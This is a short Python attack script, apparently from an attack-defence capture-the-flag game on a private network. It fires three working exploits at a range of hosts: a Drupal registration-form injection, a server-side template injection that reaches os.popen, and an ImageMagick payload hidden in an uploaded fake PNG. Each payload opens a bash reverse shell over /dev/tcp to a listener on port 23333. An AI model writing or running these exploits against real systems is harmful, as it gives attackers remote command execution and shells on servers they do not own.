import requests as req

ips = ["10.0.3.1%02d" % i for i in range(1, 17) if i != 14]


def fuck(ip):
    url = "http://" + ip + \
        "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    print(url)
    data = {
        "form_id": "user_register_form",
        "mail[0][#lazy_builder][0]": "system",
        "mail[#type]": "markup",
        "mail[0][#lazy_builder][1][0]": "bash -c 'sh -i &>/dev/tcp/10.0.3.114/23333 0>&1' &"
    }
    res = req.post(url, data=data, timeout=3)
    if res.status_code == 200:
        return res.content
    else:
        return False


def shell(ip):
    url = "http://" + ip + \
        "/sample/sign_in?user={{[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('bash -c \\'sh -i %26>/dev/tcp/10.0.3.114/23333 0>%261\\' %26')}}"
    print(url)
    res = req.get(url, timeout=3)
    if res.status_code == 200:
        return res.content
    else:
        return False


def upload_cmd(ip):
    file_data = b"""push graphic-context
viewbox 0 0 640 480
fill 'url(https://xxx.com/"|bash -c \'sh -i &>/dev/tcp/10.0.1.114/23333 0>&1\' &")'
pop graphic-context"""
    files = {
        "file": ("emmm.png", file_data, 'image/png'),
    }
    res = req.post("http://%s/upload_file.php" % ip, files=files, timeout=2)
    if res.status_code == 200:
        return res.content
    else:
        return False

if __name__ == '__main__':
    print(fuck("10.0.3.109"))
    for i in ips:
        try:
            print(fuck(i))
        except:
            print("error")
            pass
